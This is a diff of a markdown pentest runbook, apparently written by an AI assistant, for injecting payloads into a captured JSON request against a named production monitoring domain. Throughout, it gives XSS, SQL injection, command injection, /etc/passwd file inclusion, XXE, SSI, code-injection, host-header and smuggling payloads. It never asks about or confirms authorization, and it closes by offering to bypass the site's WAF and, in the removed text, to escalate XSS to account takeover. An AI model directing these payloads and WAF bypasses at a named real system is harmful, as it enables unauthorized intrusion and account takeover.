@@ -1,498 +1,442 @@
 # Data-Input-Validation
 
-Perfect—this is where you move from “trying payloads” to **structured exploitation testing**.
+**real pentester runbook**
 
-I’ll walk you through **exactly how to use THIS request** as your base and test each vulnerability **step-by-step**, with:
+We’ll use:
 
-* 🎯 Exact field to modify
-* 🧰 Tool to use
-* 🔁 What to send
-* 👀 What to observe
-* ✅ PASS / ❌ FAIL
+* **Burp Suite** (main tool)
+* Browser DevTools (for frontend/DOM)
+* Optional: curl (quick replay)
 
 ---
 
-# 🧠 0. First — Prepare Your Base Request
+# INITIAL SETUP (DO THIS ONCE)
 
-### Tool: **Burp Suite**
+## Tool: Burp Suite
 
 ### Steps:
 
-1. Intercept request → Send to **Repeater**
-2. Save it as baseline (don’t lose original)
-3. Work ONLY in Repeater
-
-👉 You’ll reuse this same request and just change **one field at a time**
-
----
-
-# 🟠 1. Reflected XSS
-
-### 🎯 Modify:
-
-```json
-"fields.columns[0].name"
-```
-
-### Payload:
-
-```html
-"><script>alert(1)</script>
-```
-
-### 🧪 Steps:
-
-1. Replace:
-
-```json
-"name":"TEST"
-```
-
-with payload
-2. Send request
-3. Check response in Burp
-4. Also check browser (if response rendered)
-
-### 👀 Observe:
-
-* Is payload returned in response?
-
-### ✅ PASS:
-
-* Encoded (`&lt;script&gt;`)
-
-### ❌ FAIL:
-
-* Raw `<script>` appears
+1. Open Burp → **Proxy → Intercept ON**
+2. Open browser through Burp
+3. Perform the action (dashboard load)
+4. Capture your request
+5. Right-click → **Send to Repeater**
 
 ---
 
-# 🟡 2. Stored XSS (VERY IMPORTANT HERE)
+## In Repeater:
 
-### 🎯 Same field:
+* You’ll see:
 
-```json
-"name"
-```
+  * Request (left)
+  * Response (right)
 
-### Payload:
-
-```html
-<svg/onload=alert(1)>
-```
-
-### 🧪 Steps:
-
-1. Inject payload
-2. Send request
-3. Go to dashboard UI
-4. Reload page / widget
-
-### 👀 Observe:
-
-* Does alert trigger?
-
-### ❌ FAIL:
-
-* Executes on load → Stored XSS
+Right-click tab → **Duplicate tab**
+Use one tab per vulnerability
 
 ---
 
-# 🔵 3. DOM-Based XSS
+# 1. STORED XSS (START HERE — highest chance)
 
-### 🧰 Tool:
+## Tool:
 
-Browser DevTools
+* Burp Repeater + Browser
 
-### 🧪 Steps:
+## Where to edit:
+
+Find in request body:
+
+```json
+"name":"HOST NAME"
+```
+
+## Replace with:
+
+```json
+"name":"<svg/onload=alert(1)>"
+```
+
+## Steps:
+
+1. Click **Send** (in Repeater)
+2. Go to browser
+3. Refresh dashboard page
+
+## Result:
+
+* ❌ FAIL → alert pops
+* ✅ PASS → no execution
+
+---
+
+# 2. REFLECTED XSS
+
+## Tool:
+
+* Burp Repeater
+
+## Replace:
+
+```json
+"name":"\"><script>alert(1)</script>"
+```
+
+## Steps:
+
+1. Click **Send**
+2. Look at **response panel (right side)**
+
+## Result:
+
+* ❌ FAIL → `<script>` appears raw
+* ✅ PASS → encoded (`&lt;script&gt;`)
+
+---
+
+# 3. DOM XSS
+
+## Tool:
+
+* Browser DevTools
+
+## Steps:
 
 1. Inject:
 
-```html
-"><img src=x onerror=alert(1)>
+```json
+"name":"\"><img src=x onerror=alert(1)>"
 ```
 
-2. Open DevTools → Elements + Sources
-3. Reload page
+2. Send request
+3. Open browser → press **F12**
+4. Go to:
 
-### 👀 Observe:
+   * **Elements tab**
+   * **Sources tab**
 
-* Is value inserted via JS?
+## What to look for:
 
-### ❌ FAIL:
+* JS inserting your payload
 
-* JS execution happens via frontend
+## Result:
+
+* ❌ FAIL → alert triggers via JS
+* ✅ PASS → safe rendering
 
 ---
 
-# 🟣 4. HTTP Parameter Pollution (HPP)
+# 4. SQL INJECTION
 
-### 🎯 Modify:
+## Tool:
 
-Duplicate fields
+* Burp Repeater
 
-### 🧪 Steps:
+## Modify:
 
-#### In JSON:
+```json
+"dashboardid":"402"
+```
+
+## Replace:
+
+```json
+"dashboardid":"402 OR 1=1"
+```
+
+## Steps:
+
+1. Send request
+2. Compare response with baseline
+
+## Look for:
+
+* Errors
+* More data
+* Different response size
+
+## Optional confirm:
+
+```bash
+sqlmap -r request.txt
+```
+
+---
+
+# 5. SSTI (Server-Side Template Injection)
+
+## Tool:
+
+* Burp Repeater + Browser
+
+## Modify:
+
+```json
+"name":"{{7*7}}"
+```
+
+## Steps:
+
+1. Send request
+2. Refresh dashboard
+
+## Result:
+
+* ❌ FAIL → shows `49`
+* ✅ PASS → shows `{{7*7}}`
+
+---
+
+# 6. COMMAND INJECTION
+
+## Tool:
+
+* Burp Repeater
+
+## Modify:
+
+```json
+"name":"test; whoami"
+```
+
+## Steps:
+
+1. Send request
+
+## Look for:
+
+* Command output
+* Delay
+
+---
+
+# 7. FILE INCLUSION (LFI)
+
+## Tool:
+
+* Burp Repeater
+
+## Modify:
+
+```json
+"name":"../../../../etc/passwd"
+```
+
+## Steps:
+
+1. Send request
+
+## Result:
+
+* ❌ FAIL → file content appears
+* ✅ PASS → blocked
+
+---
+
+# 8. HTTP PARAMETER POLLUTION (HPP)
+
+## Tool:
+
+* Burp Repeater
+
+## Modify:
 
 ```json
 "dashboardid":"402",
 "dashboardid":"999"
 ```
 
-OR:
+## Steps:
 
-```json
-"groupids":["29","999"]
-```
+1. Send request
 
-### 👀 Observe:
+## Look for:
 
 * Which value is used?
 
-### ❌ FAIL:
-
-* Filter bypass or logic confusion
-
 ---
 
-# 🟢 5. SQL Injection
+# 9. MASS ASSIGNMENT
 
-### 🎯 Modify:
+## Tool:
+
+* Burp Repeater
+
+## Add inside JSON:
 
 ```json
-"dashboardid"
-"groupids"
+"is_admin": true
 ```
 
-### Payload:
+## Steps:
 
-```sql
-402 OR 1=1
-```
+1. Send request
 
-or:
+## Look for:
 
-```sql
-29' OR '1'='1
-```
-
-### 🧪 Steps:
-
-1. Inject into field
-2. Send request
-
-### 👀 Observe:
-
-* Different response?
-* Errors?
-* More data?
-
-### ❌ FAIL:
-
-* Query manipulated
+* Role/behavior change
 
 ---
 
-# 🟤 6. LDAP Injection
+# 10. FORMAT STRING INJECTION
 
-### 🎯 Modify:
+## Tool:
+
+* Burp Repeater
+
+## Modify:
 
 ```json
-"groupids"
+"name":"%x%x%x%x"
 ```
 
-### Payload:
+## Steps:
 
-```text
-*)(uid=*))(|(uid=*
-```
+1. Send request
 
-### 👀 Observe:
+## Look for:
 
-* Unexpected results / auth bypass
+* Memory leakage / strange output
 
 ---
 
-# ⚪ 7. XML Injection (if supported)
+# 11. HOST HEADER INJECTION
 
-### 🎯 Change Content-Type:
+## Tool:
+
+* Burp Repeater
+
+## At top (headers):
+
+Replace:
 
 ```http
-Content-Type: application/xml
+Host: enterprise-monitoring.safaricombusiness.co.ke
 ```
 
-### Payload:
+With:
 
-```xml
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+```http
+Host: attacker.com
 ```
 
-### 👀 Observe:
+## Steps:
 
-* File content returned
+1. Send request
+
+## Look for:
+
+* Reflected URLs
+* Redirects
 
 ---
 
-# ⚫ 8. SSI Injection
+# 12. HTTP SMUGGLING
 
-### 🎯 Modify:
+## Tool:
 
-```json
-"name"
-```
+* Burp Repeater
 
-### Payload:
-
-```html
-<!--#exec cmd="whoami" -->
-```
-
-### 👀 Observe:
-
-* Output replaced with command result
-
----
-
-# 🔶 9. XPath Injection
-
-### 🎯 Modify:
-
-```json
-"dashboardid"
-```
-
-### Payload:
-
-```text
-' or '1'='1
-```
-
----
-
-# 🟠 10. SMTP Injection (if email exists)
-
-### Payload:
-
-```text
-\r\nBCC: attacker@mail.com
-```
-
-👉 Only relevant if emails triggered
-
----
-
-# 🔴 11. Code Injection
-
-### 🎯 Modify:
-
-```json
-"name"
-```
-
-### Payload:
-
-```python
-__import__('os').system('id')
-```
-
-### 👀 Observe:
-
-* Output / delay / crash
-
----
-
-# 🟡 12. File Inclusion
-
-### 🎯 Try fields referencing files (if any appear)
-
-### Payload:
-
-```bash
-../../../../etc/passwd
-```
-
----
-
-# 🟢 13. Command Injection
-
-### 🎯 Modify:
-
-```json
-"name"
-```
-
-### Payload:
-
-```bash
-test; whoami
-```
-
-### 👀 Observe:
-
-* Command output
-
----
-
-# 🟣 14. Format String Injection
-
-### 🎯 Modify:
-
-```json
-"name"
-```
-
-### Payload:
-
-```text
-%x%x%x%x
-```
-
-### 👀 Observe:
-
-* Memory leakage
-
----
-
-# ⚫ 15. HTTP Smuggling
-
-### 🧰 Tool:
-
-Burp Repeater
-
-### Add headers:
+## Add headers:
 
 ```http
 Transfer-Encoding: chunked
 Content-Length: 10
 ```
 
-### 👀 Observe:
+## Steps:
 
-* Weird responses / delays
+1. Send request multiple times
 
----
+## Look for:
 
-# ⚪ 16. Host Header Injection
-
-### Modify:
-
-```http
-Host: attacker.com
-```
-
-### 👀 Observe:
-
-* Reflected links / redirects
+* Delays
+* Inconsistent responses
 
 ---
 
-# 🔵 17. SSTI
+# 13. OVERFLOW TEST
 
-### 🎯 Modify:
+## Tool:
+
+* Burp Intruder
+
+## Steps:
+
+1. Send request to **Intruder**
+2. Select:
 
 ```json
-"name"
+"name":"HOST NAME"
 ```
 
-### Payload:
+3. Add payload:
 
-```jinja2
-{{7*7}}
+```
+AAAAA...(10,000+ chars)
 ```
 
-### 👀 Observe:
+4. Start attack
 
-* Returns 49 → ❌ FAIL
+## Look for:
 
----
-
-# 🟤 18. SSRF
-
-### 🎯 Look for URL fields (if any)
-
-### Payload:
-
-```bash
-http://127.0.0.1
-```
+* Crash
+* Errors
 
 ---
 
-# 🟠 19. Mass Assignment
+# 14. SSRF (NOT APPLICABLE HERE)
 
-### Add:
+👉 Your request has no URL input
+Skip unless you find:
 
-```json
-"is_admin": true
-```
-
-### 👀 Observe:
-
-* Privilege change
+* `url`
+* `endpoint`
+* `callback`
 
 ---
 
-# 🔴 20. Overflow
+# 15. XML / LDAP / XPath / SMTP
 
-### 🧰 Tool:
+👉 Not applicable to THIS JSON request
+(Only test if:
 
-Burp Intruder
-
-### Payload:
-
-* Very long string (10k+ chars)
-
----
-
-# ⚫ 21. Incubated Vulnerabilities
-
-### 🧪 Steps:
-
-1. Inject payload
-2. Wait / trigger:
-
-   * admin view
-   * scheduled jobs
+* XML endpoints
+* login/auth systems
+* email features)
 
 ---
 
-# 🧠 FINAL EXECUTION STRATEGY (IMPORTANT)
+# 🧠 FINAL WORKFLOW (THIS IS HOW YOU EXECUTE CLEANLY)
 
-### Do this in order:
+## In Burp:
 
-1. Stored XSS (most likely here)
+* Repeater → manual testing
+* Intruder → fuzzing
+
+## In Browser:
+
+* DevTools → DOM XSS
+
+---
+
+## Order to follow:
+
+1. Stored XSS
 2. Reflected XSS
-3. SSTI
-4. SQLi
-5. Mass assignment
-6. Command injection
-7. Everything else
+3. DOM XSS
+4. SSTI
+5. SQLi
+6. Command Injection
+7. Mass Assignment
+8. HPP
+9. Others
 
 ---
-
-# 🔥 Real Pentester Insight
-
-This specific request is **best suited for**:
-
-* Stored XSS ⭐⭐⭐⭐⭐
-* SSTI ⭐⭐⭐⭐
-* Mass assignment ⭐⭐⭐⭐
-* SQLi ⭐⭐⭐
-
-Less likely:
-
-* SSRF
-* Command injection
-
----
-
-# 🚀 If you want next level
 
 I can:
 
-* Analyze this request like a real bug bounty hunter and show **which vuln is MOST likely exploitable**
-* Help you **bypass filters/WAF (like Imperva/Incapsula you have there)**
-* Show how to turn Stored XSS → **account takeover**
+* Show you **how to confirm stored XSS properly (no false positives)**
+* Help you **bypass WAF (Incapsula is in your headers)**
+* Or walk you through **turning a finding into a high/critical report**
 
 Just tell me 👍
